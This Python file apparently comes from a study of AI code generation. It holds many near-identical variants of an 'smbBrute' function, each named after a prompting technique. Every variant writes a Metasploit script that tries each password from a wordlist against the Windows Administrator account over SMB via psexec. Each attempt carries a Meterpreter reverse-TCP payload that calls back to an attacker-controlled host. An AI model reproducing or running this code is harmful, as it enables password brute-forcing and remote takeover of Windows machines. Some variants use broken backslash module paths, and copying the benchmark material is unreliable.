import sys
import codecs
import os
import re
import socket

def ground_truth_code_smbBrute(configFile, tgtHost, passwdFile, lhost, lport):
    username = 'Administrator'
    pF = open(passwdFile, 'r')
    for password in pF.readlines():
        password = password.strip('\n').strip('\r')
        configFile.write('use exploit/windows/smb/psexec\n')
        configFile.write('set SMBUser ' + str(username) + '\n')
        configFile.write('set SMBPass ' + str(password) + '\n')
        configFile.write('set RHOST ' + str(tgtHost) + '\n')
        configFile.write('set payload ' + 'windows/meterpreter/reverse_tcp\n')
        configFile.write('set LPORT ' + str(lport) + '\n')
        configFile.write('set LHOST ' + lhost + '\n')
        configFile.write('exploit -j -z\n')

def persona__smbBrute(configFile, tgtHost, passwdFile, lhost, lport):
	with open(passwdFile, 'r') as pwfile, open(configFile, 'a') as configfile:
		for password in pwfile:
			password = password.rstrip('\n\r')
			configfile.write('use exploit/windows/smb/psexec\n')
			configfile.write('set SMBUser Administrator\n')
			configfile.write('set SMBPass '+str(password)+'\n')
			configfile.write('set RHOST '+str(tgtHost)+'\n')
			configfile.write('set payload windows/meterpreter/reverse_tcp\n')
			configfile.write('set LPORT '+str(lport)+'\n')
			configfile.write('set LHOST '+lhost+'\n')
			configfile.write('exploit -j -z\n')

def template__smbBrute(configFile, tgtHost, passwdFile, lhost, lport):
    try:
        with open(passwdFile, 'r') as pfile, open(configFile, 'a') as cfile:
            for password in pfile:
                password = password.rstrip('\n\r')
                cfile.write('use exploit/windows/smb/psexec\n')
                cfile.write('set SMBUser Administrator\n')
                cfile.write('set SMBPass {}\n'.format(password))
                cfile.write('set RHOST {}\n'.format(tgtHost))
                cfile.write('set payload windows/meterpreter/reverse_tcp\n')
                cfile.write('set LPORT {}\n'.format(lport))
                cfile.write('set LHOST {}\n'.format(lhost))
                cfile.write('exploit -j -z\n')
    except Exception as e:
        pass

def question_refinement__smbBrute(configFile, tgtHost, passwdFile, lhost, lport):
    with open(passwdFile, 'r', encoding='utf-8') as p:
        passwords = [line.rstrip('\r\n') for line in p]
        with open(configFile, 'w', encoding='utf-8') as c:
            for password in passwords:
                c.write('use exploit/windows/smb/psexec\nset SMBUser Administrator\nset SMBPass ' + str(password) + '\nset RHOST ' + str(tgtHost) + '\nset payload windows/meterpreter/reverse_tcp\nset LPORT ' + str(lport) + '\nset LHOST ' + lhost + '\nexploit -j -z\n')

def alternative_approaches__smbBrute(configFile, tgtHost, passwdFile, lhost, lport):
	try:
		with open(passwdFile, 'r') as pf:
			passwords = [line.rstrip('\n\r') for line in pf]
		with open(configFile, 'a') as cf:
			for password in passwords:
				config_lines = ['use exploit/windows/smb/psexec', 'set SMBUser Administrator', 'set SMBPass ' + password, 'set RHOST ' + tgtHost, 'set payload windows/meterpreter/reverse_tcp', 'set LPORT ' + str(lport), 'set LHOST ' + lhost, 'exploit -j -z']
				cf.writelines([line + '\n' for line in config_lines])
	except FileNotFoundError as e:
		raise Exception('Password file not found: ' + str(e))
	except IOError as e:
		raise Exception('Error writing to config file: ' + str(e))

def context_manager__smbBrute(configFile, tgtHost, passwdFile, lhost, lport):
    configFile.write('use exploit/windows/smb/psexec\n')
    configFile.write('set SMBUser Administrator\n')
    with open(passwdFile, 'r') as passwords:
        for password in passwords:
            password = password.strip()
            configFile.write('set SMBPass ' + str(password) + '\n')
            configFile.write('set RHOST ' + str(tgtHost) + '\n')
            configFile.write('set payload windows/meterpreter/reverse_tcp\n')
            configFile.write('set LPORT ' + str(lport) + '\n')
            configFile.write('set LHOST ' + lhost + '\n')
            configFile.write('exploit -j -z\n')

def flipped_interaction_3__smbBrute(configFile, tgtHost, passwdFile, lhost, lport):
	try:
		with open(passwdFile, 'r') as pf, open(configFile, 'a') as cf:
			for password in pf:
				password = password.strip()
				cf.write('use exploit/windows/smb/psexec\n')
				cf.write('set SMBUser Administrator\n')
				cf.write('set SMBPass ' + password + '\n')
				cf.write('set RHOST ' + tgtHost + '\n')
				cf.write('set payload windows/meterpreter/reverse_tcp\n')
				cf.write('set LPORT ' + str(lport) + '\n')
				cf.write('set LHOST ' + lhost + '\n')
				cf.write('exploit -j -z\n')
		return 'Operation successful'
	except FileNotFoundError:
		return 'Error: FileNotFoundError, check file paths'
	except Exception as e:
		return f'Error: {str(e)}'

def flipped_interaction_4__smbBrute(configFile, tgtHost, passwdFile, lhost, lport):
	with open(passwdFile, 'r') as pf:
		passwords = [password.strip() for password in pf.readlines()]
	with open(configFile, 'w') as cf:
		for password in passwords:
			cf.write('use exploit/windows/smb/psexec\n')
			cf.write('set SMBUser Administrator\n')
			cf.write(f'set SMBPass {password}\n')
			cf.write(f'set RHOST {tgtHost}\n')
			cf.write('set payload windows/meterpreter/reverse_tcp\n')
			cf.write(f'set LPORT {lport}\n')
			cf.write(f'set LHOST {lhost}\n')
			cf.write('exploit -j -z\n')

def flipped_interaction_5__smbBrute(configFile, tgtHost, passwdFile, lhost, lport):
    try:
        with open(passwdFile, 'r') as pF:
            passwords = pF.readlines()
        passwords = [password.strip() for password in passwords]
    except FileNotFoundError:
        print(f"Error: The file {passwdFile} was not found.")
        return
    except IOError:
        print(f"Error: Could not read the file {passwdFile}.")
        return
    try:
        with open(configFile, 'a') as cF:
            for password in passwords:
                cF.write('use exploit/windows/smb/psexec\n')
                cF.write('set SMBUser Administrator\n')
                cF.write(f'set SMBPass {password}\n')
                cF.write(f'set RHOST {tgtHost}\n')
                cF.write('set payload windows/meterpreter/reverse_tcp\n')
                cF.write(f'set LPORT {lport}\n')
                cF.write(f'set LHOST {lhost}\n')
                cF.write('exploit -j -z\n\n')
    except IOError:
        print(f"Error: Could not write to the file {configFile}.")
        return

def iterative_prompting_3__smbBrute(configFile, tgtHost, passwdFile, lhost, lport):
    if not isinstance(configFile, str) or not isinstance(tgtHost, str) or not isinstance(passwdFile, str) or not isinstance(lhost, str) or not isinstance(lport, int):
        raise ValueError('Invalid input types provided.')
    try:
        with open(passwdFile, 'r') as pf:
            passwords = pf.readlines()
    except FileNotFoundError:
        raise FileNotFoundError(f'The password file {passwdFile} was not found.')
    except IOError as e:
        raise IOError(f'An error occurred while reading the password file {passwdFile}: {str(e)}')
    try:
        with open(configFile, 'w') as cf:
            for password in passwords:
                password = password.rstrip('\n\r')
                cf.write('use exploit\\windows\\smb\\psexec\n')
                cf.write('set SMBUser Administrator\n')
                cf.write('set SMBPass ' + str(password) + '\n')
                cf.write('set RHOST ' + str(tgtHost) + '\n')
                cf.write('set payload windows\\meterpreter\\reverse_tcp\n')
                cf.write('set LPORT ' + str(lport) + '\n')
                cf.write('set LHOST ' + lhost + '\n')
                cf.write('exploit -j -z\n')
    except IOError as e:
        raise IOError(f'An error occurred while writing to the configuration file {configFile}: {str(e)}')

def iterative_prompting_4__smbBrute(configFile, tgtHost, passwdFile, lhost, lport):
    if not isinstance(configFile, str) or not isinstance(passwdFile, str):
        raise ValueError('configFile and passwdFile must be strings.')
    if not isinstance(tgtHost, str) or not isinstance(lhost, str):
        raise ValueError('tgtHost and lhost must be strings.')
    if not isinstance(lport, int):
        raise ValueError('lport must be an integer.')
    if not (1 <= lport <= 65535):
        raise ValueError('lport must be between 1 and 65535.')
    try:
        with open(passwdFile, 'r') as file:
            passwords = file.readlines()
    except FileNotFoundError:
        raise FileNotFoundError('Password file not found.')
    except PermissionError:
        raise PermissionError('Permission denied when trying to read password file.')
    except Exception as e:
        raise Exception(f'Error reading password file: {str(e)}')
    try:
        with open(configFile, 'w') as config:
            for password in passwords:
                password = password.strip('\n').strip('\r')
                config.write('use exploit\\windows\\smb\\psexec\n')
                config.write('set SMBUser Administrator\n')
                config.write('set SMBPass ' + password + '\n')
                config.write('set RHOST ' + tgtHost + '\n')
                config.write('set payload windows\\meterpreter\\reverse_tcp\n')
                config.write('set LPORT ' + str(lport) + '\n')
                config.write('set LHOST ' + lhost + '\n')
                config.write('exploit -j -z\n')
    except PermissionError:
        raise PermissionError('Permission denied when trying to write to configuration file.')
    except IOError:
        raise IOError('Error writing to configuration file.')
    except Exception as e:
        raise Exception(f'Unexpected error writing to configuration file: {str(e)}')

def iterative_prompting_5__smbBrute(configFile, tgtHost, passwdFile, lhost, lport):
    if not isinstance(configFile, str) or not isinstance(passwdFile, str):
        raise ValueError('configFile and passwdFile must be strings representing file paths.')
    if not isinstance(tgtHost, str) or not all(part.isdigit() and 0 <= int(part) <= 255 for part in tgtHost.split('.')) or tgtHost.count('.') != 3:
        raise ValueError('tgtHost must be a valid IP address.')
    if not isinstance(lhost, str) or not all(part.isdigit() and 0 <= int(part) <= 255 for part in lhost.split('.')) or lhost.count('.') != 3:
        raise ValueError('lhost must be a valid IP address.')
    if not isinstance(lport, int):
        raise ValueError('lport must be an integer.')
    if lport < 0 or lport > 65535:
        raise ValueError('lport must be a valid port number between 0 and 65535.')
    try:
        with open(passwdFile, 'r') as f:
            passwords = f.readlines()
    except FileNotFoundError:
        raise FileNotFoundError('Password file not found.')
    except IOError:
        raise IOError('Error reading the password file.')
    try:
        with open(configFile, 'w') as f:
            for password in passwords:
                password = password.rstrip('\r\n')
                f.write('use exploit\windows\smb\psexec\n')
                f.write('set SMBUser Administrator\n')
                f.write('set SMBPass ' + password + '\n')
                f.write('set RHOST ' + tgtHost + '\n')
                f.write('set payload windows\meterpreter\reverse_tcp\n')
                f.write('set LPORT ' + str(lport) + '\n')
                f.write('set LHOST ' + lhost + '\n')
                f.write('exploit -j -z\n')
    except IOError:
        raise IOError('Error writing to the config file.')

def few_shots_prompting__smbBrute(configFile, tgtHost, passwdFile, lhost, lport):
	with open(passwdFile, 'r') as f:
		passwords = f.readlines()
	with open(configFile, 'a') as config:
		for password in passwords:
			password = password.strip()
			config.write('use exploit/windows/smb/psexec\n')
			config.write('set SMBUser Administrator\n')
			config.write('set SMBPass ' + password + '\n')
			config.write('set RHOST ' + tgtHost + '\n')
			config.write('set payload windows/meterpreter/reverse_tcp\n')
			config.write('set LPORT ' + str(lport) + '\n')
			config.write('set LHOST ' + lhost + '\n')
			config.write('exploit -j -z\n')

def cot_prompting__smbBrute(configFile, tgtHost, passwdFile, lhost, lport):
    with open(passwdFile, 'r') as pf:
        for password in pf.readlines():
            password = password.strip()
            with open(configFile, 'a') as cf:
                cf.write('use exploit/windows/smb/psexec\n')
                cf.write('set SMBUser Administrator\n')
                cf.write('set SMBPass ' + str(password) + '\n')
                cf.write('set RHOST ' + str(tgtHost) + '\n')
                cf.write('set payload windows/meterpreter/reverse_tcp\n')
                cf.write('set LPORT ' + str(lport) + '\n')
                cf.write('set LHOST ' + lhost + '\n')
                cf.write('exploit -j -z\n')

def fact_check_list__smbBrute(configFile, tgtHost, passwdFile, lhost, lport):
    with open(passwdFile, 'r') as file:
        passwords = file.readlines()
    with open(configFile, 'a') as config:
        for password in passwords:
            clean_password = password.strip()
            config.write('use exploit/windows/smb/psexec\n')
            config.write('set SMBUser Administrator\n')
            config.write('set SMBPass {}\n'.format(clean_password))
            config.write('set RHOST {}\n'.format(tgtHost))
            config.write('set payload windows/meterpreter/reverse_tcp\n')
            config.write('set LPORT {}\n'.format(lport))
            config.write('set LHOST {}\n'.format(lhost))
            config.write('exploit -j -z\n\n')

def not_interactive_mix__smbBrute(configFile, tgtHost, passwdFile, lhost, lport):
    try:
        socket.inet_aton(tgtHost)
    except socket.error:
        return "Invalid target host IP address."
    try:
        socket.inet_aton(lhost)
    except socket.error:
        return "Invalid local host IP address."
    if not (0 <= lport <= 65535):
        return "Local port number out of range."
    if not os.path.exists(configFile):
        return f"The configuration file {configFile} does not exist."
    if not os.path.exists(passwdFile):
        return f"The password file {passwdFile} does not exist."
    try:
        with open(passwdFile, 'r') as pf, open(configFile, 'w') as cf:
            for password in pf:
                password = password.strip()
                cf.write('use exploit/windows/smb/psexec\n')
                cf.write('set SMBUser Administrator\n')
                cf.write('set SMBPass %s\n' % password)
                cf.write('set RHOST %s\n' % tgtHost)
                cf.write('set payload windows/meterpreter/reverse_tcp\n')
                cf.write('set LPORT %s\n' % str(lport))
                cf.write('set LHOST %s\n' % lhost)
                cf.write('exploit -j -z\n')
    except IOError as e:
        return f"An error occurred while accessing the files: {e}"

def interactive_mix__smbBrute(configFile, tgtHost, passwdFile, lhost, lport):
    from ipaddress import ip_address, IPv4Address, IPv6Address
    import os
    try:
        if isinstance(ip_address(tgtHost), (IPv4Address, IPv6Address)):
            pass
        else:
            raise ValueError("Invalid IP address for tgtHost.")
    except ValueError as e:
        return f"Error: {e}"
    try:
        if isinstance(ip_address(lhost), (IPv4Address, IPv6Address)):
            pass
        else:
            raise ValueError("Invalid IP address for lhost.")
    except ValueError as e:
        return f"Error: {e}"
    if not isinstance(lport, int) or not (0 < lport <= 65535):
        return "Error: LPORT must be an integer between 1 and 65535."
    if not os.path.isfile(passwdFile):
        return f"Error: Password file '{passwdFile}' not found."
    try:
        with open(passwdFile, 'r') as f:
            passwords = f.readlines()
        with open(configFile, 'a') as config:
            for password in passwords:
                password = password.strip('\n\r')
                config.write('use exploit/windows/smb/psexec\n')
                config.write('set SMBUser Administrator\n')
                config.write(f'set SMBPass {password}\n')
                config.write(f'set RHOST {tgtHost}\n')
                config.write('set payload windows/meterpreter/reverse_tcp\n')
                config.write(f'set LPORT {lport}\n')
                config.write(f'set LHOST {lhost}\n')
                config.write('exploit -j -z\n')
    except IOError as e:
        return f"IOError: {e}"
    except Exception as e:
        return f"Unexpected error: {e}"
    return "Configuration completed successfully."

def baseline__smbBrute(configFile, tgtHost, passwdFile, lhost, lport):
	with open(passwdFile, 'r') as password_file, open(configFile, 'w') as config_file:
		for password in password_file:
			password = password.strip()
			config_file.write('use exploit/windows/smb/psexec\n')
			config_file.write('set SMBUser Administrator\n')
			config_file.write('set SMBPass ' + str(password) + '\n')
			config_file.write('set RHOST ' + str(tgtHost) + '\n')
			config_file.write('set payload windows/meterpreter/reverse_tcp\n')
			config_file.write('set LPORT ' + str(lport) + '\n')
			config_file.write('set LHOST ' + lhost + '\n')
			config_file.write('exploit -j -z\n')
